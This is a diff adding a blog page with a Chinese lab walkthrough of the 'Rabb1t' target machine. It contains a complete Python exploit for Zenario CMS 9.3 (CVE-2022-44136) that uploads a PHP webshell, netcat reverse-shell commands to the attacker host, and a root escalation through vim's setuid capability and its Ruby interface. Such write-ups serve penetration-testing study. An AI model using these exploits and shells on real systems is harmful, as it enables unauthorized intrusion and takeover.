@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="![image-20250719210601338](https://7r1UMPHK.github.io/image/20250719210613707.webp)
+
+这靶机名字起的好，哈哈哈
+
+# 一、信息收集与服务探测
+
+## 1. 主机发现
+
+首先，使用 `arp-scan` 在本地网络中发现目标主机的IP地址。">
+<meta property="og:title" content="内部_Rabb1t">
+<meta property="og:description" content="![image-20250719210601338](https://7r1UMPHK.github.io/image/20250719210613707.webp)
+
+这靶机名字起的好，哈哈哈
+
+# 一、信息收集与服务探测
+
+## 1. 主机发现
+
+首先，使用 `arp-scan` 在本地网络中发现目标主机的IP地址。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Rabb1t.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>内部_Rabb1t</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+<style>.markdown-alert{padding:0.5rem 1rem;margin-bottom:1rem;border-left:.25em solid var(--borderColor-default,var(--color-border-default));}.markdown-alert .markdown-alert-title {display:flex;font-weight:var(--base-text-weight-medium,500);align-items:center;line-height:1;}.markdown-alert>:first-child {margin-top:0;}.markdown-alert>:last-child {margin-bottom:0;}</style><style>.markdown-alert.markdown-alert-tip {border-left-color:var(--borderColor-success-emphasis, var(--color-success-emphasis));background-color:var(--color-success-subtle);}.markdown-alert.markdown-alert-tip .markdown-alert-title {color: var(--fgColor-success,var(--color-success-fg));}</style>
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_Rabb1t</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/149" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c0d82f812ce2915ccc4a226ffb4f89ae75407d6bff5b61b93b5376067f52fa1d/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303731393231303631333730372e77656270"><img src="https://camo.githubusercontent.com/c0d82f812ce2915ccc4a226ffb4f89ae75407d6bff5b61b93b5376067f52fa1d/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303731393231303631333730372e77656270" alt="image-20250719210601338" data-canonical-src="https://7r1UMPHK.github.io/image/20250719210613707.webp" style="max-width: 100%;"></a></p>
+<p>这靶机名字起的好，哈哈哈</p>
+<h1>一、信息收集与服务探测</h1>
+<h2>1. 主机发现</h2>
+<p>首先，使用 <code class="notranslate">arp-scan</code> 在本地网络中发现目标主机的IP地址。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l                     
+[sudo] kali 的密码：
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
+192.168.205.198 08:00:27:f1:94:b8       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.
+...</pre></div>
+<p>扫描结果确认目标靶机的 IP 地址为 <strong><code class="notranslate">192.168.205.198</code></strong>。</p>
+<h2>2. 端口扫描与动态端口分析</h2>
+<p>使用 <code class="notranslate">nmap</code> 对目标主机进行端口扫描。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p- 192.168.205.198
+...
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+1028/tcp open  unknown
+...</pre></div>
+<p>多次扫描发现，除了固定的 22 和 80 端口外，还有一个端口号在 1024 以上的端口是动态变化的，每次扫描后端口号会增加2，且有大约10秒的开放间隔。这是一个动态服务的迹象。</p>
+<p>为了稳定地访问这个动态端口，编写了一个 bash 脚本，该脚本能自动发现当前开放的端口，并使用 <code class="notranslate">socat</code> 将其流量转发到本地的一个固定端口。</p>
+<h3><strong>端口转发脚本 (<code class="notranslate">a.sh</code>)</strong></h3>
+<pre class="notranslate"><code class="notranslate">#!/bin/bash
+
+IP=$1
+LP=8000
+PP=1028
+PF=/tmp/socat.pid
+
+g(){
+  while :;do
+    (echo &gt; /dev/tcp/$IP/$PP) 2&gt;/dev/null &amp;&amp; break || PP=$((PP+2))
+    [ $PP -gt 65535 ] &amp;&amp; PP=1030
+  done
+}
+
+[ -f $PF ] &amp;&amp; kill $(cat $PF) 2&gt;/dev/null &amp;&amp; rm $PF
+
+g
+socat TCP-LISTEN:$LP,fork,reuseaddr TCP:$IP:$PP &amp;
+echo $! &gt; $PF
+
+while :;do
+  (echo &gt; /dev/tcp/$IP/$PP) 2&gt;/dev/null || {
+    kill $(cat $PF); rm $PF
+    PP=$((PP+2))
+    [ $PP -gt 65535 ] &amp;&amp; PP=1030
+    g
+    socat TCP-LISTEN:$LP,fork,reuseaddr TCP:$IP:$PP &amp;
+    echo $! &gt; $PF
+  }
+  sleep 1
+done
+</code></pre>
+<p>运行此脚本后，动态端口的服务被成功转发到本地的 <code class="notranslate">8000</code> 端口。</p>
+<h1>二、Web应用渗透与漏洞利用</h1>
+<h2>1. 目录扫描与信息泄露</h2>
+<p>通过本地 <code class="notranslate">8000</code> 端口对转发的服务进行目录扫描。</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ ffuf -u "http://192.168.205.128:8000/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --fl 15 -e .php,.txt,.html,.zip
+...
+password.txt            [Status: 200, Size: 74, Words: 11, Lines: 4, Duration: 9ms]
+robots.txt              [Status: 200, Size: 251, Words: 12, Lines: 12, Duration: 214ms]
+...
+</code></pre>
+<p>扫描发现了 <code class="notranslate">robots.txt</code> 文件，其内容泄露了多个后台目录，其中最关键的是 <code class="notranslate">zenario</code>。</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ curl http://192.168.205.128:8000/robots.txt
+User-agent: *
+Disallow: /admin/
+...
+Disallow: /zenario/
+...
+</code></pre>
+<p>访问该 Web 服务，查看源代码，发现其使用了 <strong>Zenario CMS</strong>，版本号为 <code class="notranslate">9.3.57186</code>。</p>
+<h2>2. Zenario CMS 漏洞利用</h2>
+<p>通过搜索公开漏洞库，发现 Zenario CMS 9.3 版本存在一个未经身份验证的远程代码执行漏洞 <strong>(<a title="CVE-2022-44136" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-4p38-rc98-cr39/hovercard" href="https://github.com/advisories/GHSA-4p38-rc98-cr39">CVE-2022-44136</a>)</strong>。根据公开的 PoC，我们编写了一个利用脚本 (<code class="notranslate">exp.py</code>) 来上传一个 webshell。</p>
+<div class="markdown-alert markdown-alert-tip"><p class="markdown-alert-title"><svg class="octicon octicon-light-bulb mr-2" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>Tip</p>
+<p><a href="https://com0t.github.io/zenar.io/2022/10/18/Unauthent-RCE-Zenar.io~9.3.html" rel="nofollow">https://com0t.github.io/zenar.io/2022/10/18/Unauthent-RCE-Zenar.io~9.3.html</a></p>
+</div>
+<h3>利用脚本exp.py</h3>
+<pre class="notranslate"><code class="notranslate">#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+# Exploit Title: Zenario CMS 9.3 - Unauthenticated Remote Code Execution (RCE)
+# CVE: CVE-2022-44136
+# Author: Gemini (based on provided request analysis)
+# Date: 2025-07-19
+# Description: This script exploits an unrestricted file upload vulnerability in
+# Zenario CMS 9.3. The vulnerability is triggered by a typo in the Content-Type
+# header (`Content-Tyope`) which bypasses the file type validation, allowing
+# the upload of a PHP webshell.
+
+import requests
+import argparse
+import sys
+import json
+from urllib.parse import urljoin
+
+# 关闭requests库因证书验证失败而产生的警告
+requests.packages.urllib3.disable_warnings()
+
+def print_banner():
+    """打印一个漂亮的横幅"""
+    print("=" * 60)
+    print(" Zenario CMS 9.3 Unauthenticated RCE Exploit (CVE-2022-44136)")
+    print("=" * 60)
+
+def exploit(target_url, instance_id, filename):
+    """执行漏洞利用的核心函数"""
+    
+    endpoint = "/zenario/ajax.php"
+    upload_url = urljoin(target_url, endpoint)
+
+    # Webshell的内容
+    webshell_content = b"&lt;?php echo '&gt;&gt;&gt;'; system($_GET['cmd']); echo '&lt;&lt;&lt;'; ?&gt;"
+
+    # URL查询参数，与截图中保持一致
+    params = {
+        'method_call': 'handlePluginAJAX',
+        'cID': '1',
+        'slideId': '0',
+        'cType': 'html',
+        'instanceId': instance_id,
+        'fileUpload': ''
+    }
+
+    # 这是要上传的文件。我们先正常定义它。
+    # ('fileUpload', (filename, webshell_content, 'image/jpeg'))
+    #  ^--表单字段名      ^--文件名   ^--文件内容      ^--一个无害的Content-Type
+    files = {
+        'fileUpload': (filename, webshell_content, 'image/jpeg')
+    }
+
+    print(f"[*] 准备向 {upload_url} 上传webshell...")
+    print(f"[*] 使用 Instance ID: {instance_id}")
+    print(f"[*] 上传文件名: {filename}")
+
+    # --- 关键的绕过步骤 ---
+    # 1. 使用requests库准备一个请求对象，但先不发送
+    session = requests.Session()
+    req = requests.Request('POST', upload_url, params=params, files=files)
+    prepared_req = req.prepare()
+
+    # 2. prepared_req.body是bytes类型，包含了整个multipart/form-data的内容
+    #    我们将其解码为字符串，进行替换操作，然后再编码回去
+    body_str = prepared_req.body.decode('utf-8', errors='ignore')
+
+    # 3. 将 "Content-Type" 替换为 "Content-Tyope"，这是漏洞的核心
+    modified_body_str = body_str.replace('Content-Type: image/jpeg', 'Content-Tyope: image/svg+xml')
+    prepared_req.body = modified_body_str.encode('utf-8')
+    
+    # 4. 更新Content-Length头，因为我们的修改可能导致长度变化（尽管这里没有）
+    prepared_req.headers['Content-Length'] = str(len(prepared_req.body))
+
+    print("[+] 请求已被修改，注入 'Content-Tyope' 绕过代码。")
+    print("[*] 正在发送恶意请求...")
+
+    try:
+        # 5. 发送我们手动修改过的请求
+        response = session.send(prepared_req, verify=False, timeout=15)
+
+        # 检查响应是否成功
+        if response.status_code == 200:
+            print("[+] 服务器返回 200 OK，可能上传成功！")
+            try:
+                # 解析服务器返回的JSON
+                response_json = response.json()
+                file_path = response_json['files'][0]['path']
+                
+                # 构建完整的webshell URL
+                webshell_url = urljoin(target_url, f"{file_path}")
+                print("\n" + "="*60)
+                print(f"[\033[1;32mSUCCESS\033[0m] Webshell上传成功!")
+                print(f"[\033[1;32mURL\033[0m]: {webshell_url}")
+                print("="*60 + "\n")
+                return webshell_url
+            except (json.JSONDecodeError, KeyError, IndexError):
+                print("[-] 上传成功，但无法从响应中解析文件路径。")
+                print("[-] 响应内容: ", response.text)
+                return None
+        else:
+            print(f"[-] 上传失败，服务器返回状态码: {response.status_code}")
+            return None
+
+    except requests.exceptions.RequestException as e:
+        print(f"[-] 请求发生错误: {e}")
+        return None
+
+def interactive_shell(webshell_url):
+    """提供一个交互式的命令执行环境"""
+    print("[*] 启动交互式Webshell... (输入 'exit' 退出)")
+    session = requests.Session()
+    try:
+        while True:
+            cmd = input("\033[1;34mcmd &gt; \033[0m")
+            if cmd.lower() in ['exit', 'quit']:
+                break
+            
+            # 发送GET请求来执行命令
+            params = {'cmd': cmd}
+            try:
+                response = session.get(webshell_url, params=params, verify=False, timeout=10)
+                # 提取由 '&gt;&gt;&gt;' 和 '&lt;&lt;&lt;' 包裹的命令输出
+                output = response.text.split('&gt;&gt;&gt;')[1].split('&lt;&lt;&lt;')[0]
+                print(output)
+            except requests.exceptions.RequestException as e:
+                print(f"[-] 命令执行失败: {e}")
+            except IndexError:
+                 print(f"[-] 无法从响应中提取命令输出。")
+                 print(f"[-] 原始响应: {response.text}")
+
+
+    except KeyboardInterrupt:
+        print("\n[*] 检测到Ctrl+C，正在退出。")
+    print("[*] Webshell会话已关闭。")
+
+
+if __name__ == '__main__':
+    print_banner()
+    parser = argparse.ArgumentParser(description="Zenario CMS 9.3 RCE (CVE-2022-44136) Exploit")
+    parser.add_argument("target_url", help="目标URL (例如: http://192.168.205.128:8000)")
+    parser.add_argument("--instance-id", default="20", help="文件上传表单的instanceId (默认为20)")
+    parser.add_argument("--filename", default="shell.php", help="上传的webshell文件名 (默认为shell.php)")
+    
+    if len(sys.argv) == 1:
+        parser.print_help()
+        sys.exit(1)
+        
+    args = parser.parse_args()
+    
+    shell_url = exploit(args.target_url, args.instance_id, args.filename)
+    
+    if shell_url:
+        interactive_shell(shell_url)
+    else:
+        print("\n[-] 漏洞利用失败，未能获取Webshell。")
+                                           
+</code></pre>
+<p>执行利用脚本：</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ python3 exp.py http://192.168.205.128:8000                            
+============================================================
+ Zenario CMS 9.3 Unauthenticated RCE Exploit (CVE-2022-44136)
+============================================================
+[*] 准备向 http://192.168.205.128:8000/zenario/ajax.php 上传webshell...
+[*] 使用 Instance ID: 20
+[*] 上传文件名: shell.php
+[+] 请求已被修改，注入 'Content-Tyope' 绕过代码。
+[*] 正在发送恶意请求...
+[+] 服务器返回 200 OK，可能上传成功！
+
+============================================================
+[SUCCESS] Webshell上传成功!
+[URL]: http://192.168.205.128:8000/private/uploads/JEk-Wwl_SpBQMaPvCw3mgBcAB1m7bw/shell.php
+============================================================
+
+[*] 启动交互式Webshell... (输入 'exit' 退出)
+cmd &gt; id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>脚本成功上传了一个PHP webshell，并获得了 <code class="notranslate">www-data</code> 用户的命令执行权限。</p>
+<h1>三、初始访问与本地枚举</h1>
+<h2>1. 反弹 Shell</h2>
+<p>为了获得更稳定的交互式会话，在攻击机上设置 Netcat 监听，并从 webshell 中执行反弹 shell 命令。</p>
+<p><strong>攻击机监听:</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 8888</pre></div>
+<p><strong>Webshell 中执行:</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cmd <span class="pl-k">&gt;</span> busybox nc 192.168.205.128 8888 -e /bin/bash</pre></div>
+<p>成功获得 <code class="notranslate">www-data</code> 用户的反弹 shell，并升级为标准的 TTY。</p>
+<pre class="notranslate"><code class="notranslate">script /dev/null -c bash
+Ctrl+Z
+stty raw -echo; fg
+reset xterm  
+export TERM=xterm  
+export SHELL=/bin/bash  
+stty rows 24 columns 80
+</code></pre>
+<h2>2. 本地信息收集</h2>
+<p>在 <code class="notranslate">/home</code> 目录下发现用户 <code class="notranslate">morii</code>，并在其家目录下找到并读取了 <code class="notranslate">user.txt</code> 文件。</p>
+<pre class="notranslate"><code class="notranslate">www-data@Rabb1t:/home/morii$ ls -al
+...
+-rw-r--r-- 1 morii morii   32 Jul 17 11:09 user.txt
+www-data@Rabb1t:/home/morii$ cat user.txt 
+flag{user_Down the Rabbit-Hole}
+</code></pre>
+<h1>四、权限提升</h1>
+<h2>1. SUID/Capabilities 权限检查</h2>
+<p>对系统进行权限提升向量的排查。<code class="notranslate">find</code> 命令查找 SUID 文件，但未发现明显可利用的异常文件。接着使用 <code class="notranslate">getcap</code> 检查文件的 Capabilities。</p>
+<pre class="notranslate"><code class="notranslate">www-data@Rabb1t:/home/morii$ getcap -r / 2&gt;/dev/null
+/usr/bin/vim = cap_setuid+ep
+...
+</code></pre>
+<p>发现 <code class="notranslate">/usr/bin/vim</code> 被授予了 <code class="notranslate">cap_setuid+ep</code> 权限。这意味着 Vim 进程可以调用 <code class="notranslate">setuid()</code> 系统调用来改变其有效用户ID (EUID)。</p>
+<h2>2. 利用 Vim Capabilities 提权</h2>
+<p>检查 Vim 的编译选项，确认其是否支持可用于执行代码的脚本接口。</p>
+<pre class="notranslate"><code class="notranslate">www-data@Rabb1t:/home/morii$ vim --version
+...
+-python            -python3           +ruby              
+...
+</code></pre>
+<p>结果显示，虽然 Python 接口被禁用了，但 <strong>Ruby (<code class="notranslate">+ruby</code>)</strong> 接口是启用的。我们可以利用 Vim 的 Ruby 接口，结合 <code class="notranslate">cap_setuid</code> 权限来执行代码并提权至 root。</p>
+<p><strong>提权步骤：</strong></p>
+<ol>
+<li>
+<p>在攻击机上开启 Netcat 监听以接收 root shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">nc -lvnp 8888</pre></div>
+</li>
+<li>
+<p>在靶机上执行一条精心构造的 Vim 命令。该命令利用 Ruby 接口首先将进程的 EUID 设置为 0 (root)，然后执行一个反弹 shell 命令。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">vim -c <span class="pl-s"><span class="pl-pds">'</span>:ruby Process::Sys.setuid(0); exec("busybox nc 192.168.205.128 8888 -e /bin/bash")<span class="pl-pds">'</span></span></pre></div>
+</li>
+</ol>
+<p>攻击机成功接收到连接，获得了一个 <code class="notranslate">euid=0</code> 的 root 权限 shell。</p>
+<h1>3. 获取最终凭证</h1>
+<p>在 root shell 中，读取 <code class="notranslate">/root</code> 目录下的最终 flag 文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@Rabb1t:/home/morii# id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+root@Rabb1t:/home/morii# cat /root/root.txt /home/morii/user.txt 
+flag{root_Alice’s Evidence}
+flag{user_Down the Rabbit-Hole}</pre></div>
+<p>至此，渗透测试完成，成功获取了系统的 root 权限。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
